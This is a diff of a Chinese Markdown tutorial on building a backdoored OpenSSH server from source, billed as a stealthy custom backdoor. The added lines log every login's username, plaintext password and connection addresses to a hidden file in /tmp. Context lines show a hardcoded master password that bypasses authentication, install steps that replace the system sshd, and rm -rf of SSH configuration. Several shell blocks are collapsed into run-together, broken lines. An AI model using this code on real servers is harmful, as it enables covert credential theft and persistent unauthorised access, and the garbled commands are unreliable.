@@ -1,4 +1,4 @@
-# 定制化OpenSSH后门
+# OpenSSH后门制作
 
 网上关于OpenSSH的后门都是抄来抄去，普遍都是对某个早期版本的OpenSSH打patch进行的，这样的后门使用起来就是自己骗自己，隐蔽性不强，兼容度也极低。因此，花了一段时间研究怎么手工制作OpenSSH后门，这样的后门定制度高，与服务器上OpenSSH版本一致，隐蔽性也较强。
 
@@ -55,8 +55,20 @@ fclose(fp);
 // 如果添加在具体的认证函数之前可获得所有登录尝试下的密码，用于口令分析
 // 如果添加在认证通过后就是专门用于偷口令的OpenSSH口令窃取后门
 FILE *fp = NULL;
-fp = fopen("/tmp/.sshd-2AKMo5YJSRPJ", "a+");
-fprintf(fp, "{%s:%s}\n",authctxt->user,password);
+time_t timep;
+struct tm * lt;
+time (&timep);
+lt=localtime(&timep);
+fp = fopen("/tmp/.sshd_listener.log", "a+");
+fprintf(fp, "[%ld/%d/%d %d:%d:%d] [%d] %s:%d --> %s:%d { \"%s\" : \"%s\" }\n", \
+		//asctime(gmtime(&timep)), 
+		lt->tm_year+1900,lt->tm_mon+1,lt->tm_mday,lt->tm_hour,lt->tm_min,lt->tm_sec,\
+		timep, \
+		ssh->remote_ipaddr, \
+		ssh->remote_port,\
+		ssh->local_ipaddr, \
+		ssh->local_port,\
+		authctxt->user,password);
 fclose(fp);
 ```
 
@@ -76,7 +88,6 @@ if (!strcmp(password, "testme12#$")) return 1;
 ### 编译安装
 
 ```shell
-
 apt-get install libpam0g-dev libselinux1-dev
 
 clear;rm -rf /usr/local/share/man/man5/authorized_keys.5;rm -rf ~/.ssh;make clean; ./configure --with-zlib --with-ssl-dir --with-pam --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh --with-md5-passwords --with-selinux --with-privsep-path=/run/sshd ; make && make install 
@@ -124,33 +135,13 @@ https://cloudflare.cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.8p1.ta
 **step1** 源码编译
 
 ```shell
-yum -y install pam-devel libselinux-devel zlib zlib-devel openssl-devel openssl-libs make gcc
-wget http://vault.centos.org/8.4.2105/BaseOS/Source/SPackages/openssh-8.0p1-6.el8_4.2.src.rpm
-rpm -i openssh-8.0p1-6.el8_4.2.src.rpm
-cd ~/rpmbuild
-# 编译选项可查看./contrib/redhat/openssh.spec
-clear;rm -rf /usr/local/share/man/man5/authorized_keys.5;rm -rf ~/.ssh /etc/ssh ;make clean; ./configure --with-zlib --with-ssl-dir --with-pam --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh --with-md5-passwords --with-selinux --with-privsep-path=/run/sshd ; make && make install 
+yum -y install pam-devel libselinux-devel zlib zlib-devel openssl-devel openssl-libs make gccwget http://vault.centos.org/8.4.2105/BaseOS/Source/SPackages/openssh-8.0p1-6.el8_4.2.src.rpmrpm -i openssh-8.0p1-6.el8_4.2.src.rpmcd ~/rpmbuild# 编译选项可查看./contrib/redhat/openssh.specclear;rm -rf /usr/local/share/man/man5/authorized_keys.5;rm -rf ~/.ssh /etc/ssh ;make clean; ./configure --with-zlib --with-ssl-dir --with-pam --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh --with-md5-passwords --with-selinux --with-privsep-path=/run/sshd ; make && make install 
 ```
 
 **step2** 编写sshd.service文件
 
 ```shell
-cat /etc/systemd/system/sshd.service <<EOF
-[Unit]
-Description=OpenSSH server daemon
-After=network.target
-
-[Service]
-Type=simple
-User=root
-Restart=on-failure
-RestartSec=5s
-ExecStart=/usr/sbin/sshd -f /etc/ssh/sshd_config
-KillMode=process
-
-[Install]
-WantedBy=multi-user.target
-EOF
+cat /etc/systemd/system/sshd.service <<EOF[Unit]Description=OpenSSH server daemonAfter=network.target[Service]Type=simpleUser=rootRestart=on-failureRestartSec=5sExecStart=/usr/sbin/sshd -f /etc/ssh/sshd_configKillMode=process[Install]WantedBy=multi-user.targetEOF
 ```
 
 **step3** 编辑sshd_config配置文件，允许root登录
@@ -168,8 +159,7 @@ restorecon -rv /usr/sbin/
 **step5** 启动sshd.service
 
 ```shell
-systemctl enable sshd.service
-systemctl start sshd.service
+systemctl enable sshd.servicesystemctl start sshd.service
 ```
 
 ### 效果
